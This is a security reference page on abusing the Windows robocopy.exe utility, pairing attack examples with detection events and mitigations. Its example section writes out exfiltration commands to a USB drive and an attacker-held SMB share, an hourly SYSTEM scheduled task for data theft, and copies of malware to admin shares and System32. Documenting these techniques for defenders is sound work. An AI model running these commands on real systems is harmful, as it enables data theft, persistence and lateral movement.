# robocopy.exe
## What is it?
*```robocopy.exe``` (Robust File Copy) is a **built-in Windows command-line utility** designed for fast and resilient file copying.*
*Unlike traditional ```copy``` or ```xcopy```, it supports **advanced options**, such as:*

- **Copying files while maintaining timestamps & attributes**
- **Mirroring entire directories (backup replication)**
- **Copying files even when interrupted**

*Because it's a **trusted**, **built-in Windows binary**, security tools often **overlook its misuse**.*

## Legitimate Usage
- **Backup & Sync Files** → Copy files while preserving attributes (```/MIR```, ```/COPYALL```)
- **Network File Transfers** → Move data between local and remote systems (```/E```, ```/ZB```)
- **Fast Data Migration** → Copy large datasets efficiently (```/MT```)
- **Automated File Management** → Use in scripts for scheduled backups

## How to abuse it
- **File Transfer & Exfiltration** → Copy sensitive data for theft
- **Bypassing Security Controls** → Uses a trusted Microsoft binary (LOLBas)
- **Persistence via Scheduled Tasks** → Automate data theft on a schedule
- **Privilege Escalation & Lateral Movement** → Copy files over SMB to evade detection

## Example attacks
### 1. Data Exfiltration (Stealthy File Copying)
*Attackers can use ```robocopy.exe``` to **steal files** from a system and move them to an external drive or network share.*

**Copy All Files to an External USB Drive**
```
robocopy C:\SensitiveData E:\Backup /E /ZB /COPYALL /R:0 /W:0 /NDL /NFL /NP
```
**Effect:**
- ```/E``` → Copy all files and subdirectories
- ```/ZB``` → Use restartable mode (bypasses some locked files)
- ```/COPYALL``` → Copy all attributes (timestamps, ACLs, etc.)
- ```/NDL /NFL /NP``` → Avoid logging details to stay stealthy

### 2. Exfiltration Over a Network Share
*Attackers may copy data to a remote SMB share, bypassing detection.*

**Transfer Files Over SMB to an Attacker-Controlled Share**
```
robocopy C:\SensitiveData \\192.168.1.100\share /E /MIR /LOG+:C:\Windows\Temp\log.txt
```
**Effect:**
- *Mirrors the folder to ```\\192.168.1.100\share```*
- *Logs activity to ```log.txt``` for stealth*

### 3. Persistence via Scheduled Tasks
*Attackers can use robocopy.exe to schedule periodic data exfiltration.*

**Set Up a Scheduled Task to Copy Data Every Hour**
```
schtasks /create /tn "BackupJob" /tr "robocopy C:\SensitiveData \\192.168.1.100\backup /E" /sc hourly /ru SYSTEM
```
*Runs every hour under ```SYSTEM```, ensuring stealth and persistence*

### 4. Lateral Movement via SMB & Admin Shares
*Using ```robocopy.exe```, an attacker with admin credentials can copy malware or tools across systems via SMB.*

**Push Malware to Another System's Admin Share**
```
robocopy payloads \\192.168.1.50\C$\Windows\Temp /E
```
*Copies all files in ```payloads``` to the ```C$``` share of ```192.168.1.50```*

### 5. Bypassing File Execution Restrictions
*Attackers can use ```robocopy.exe``` to **bypass AppLocker or Software Restriction Policies (SRP)** by copying files into a trusted directory (e.g., ```C:\Windows\System32```).*

**Copy Malware to a Trusted Directory**
```
robocopy C:\MalwareFolder C:\Windows\System32 /E /COPYALL
```
*Places malware in a **whitelisted directory**, bypassing security controls*

# Detection & Mitigation
## Detection Methods
**Monitor Large File Transfers**
- **Event ID 4663 (File Access)** → Detect bulk file movements
- **Look for ```robocopy.exe``` writing to USB devices (E:, F:, etc.)**

**Detect Suspicious Network Activity**
- **Event ID 5140 (SMB Connection)** → Monitor outbound file transfers
- **Look for unauthorized SMB access (e.g., copying files to external shares)**

**Scheduled Task Creation**
- **Event ID 4698 (Scheduled Task Created)** → Detect persistence attempts

## Mitigation Strategies
- **Restrict External Drive Access** → Block unauthorized USB file transfers.
- **Use Application Control (AppLocker, WDAC)** → Prevent unauthorized ```robocopy.exe``` execution.
- **Monitor File Access Logs** → Detect unusual file transfers.
- **Disable Unused Admin Shares** → Reduce SMB attack surface.
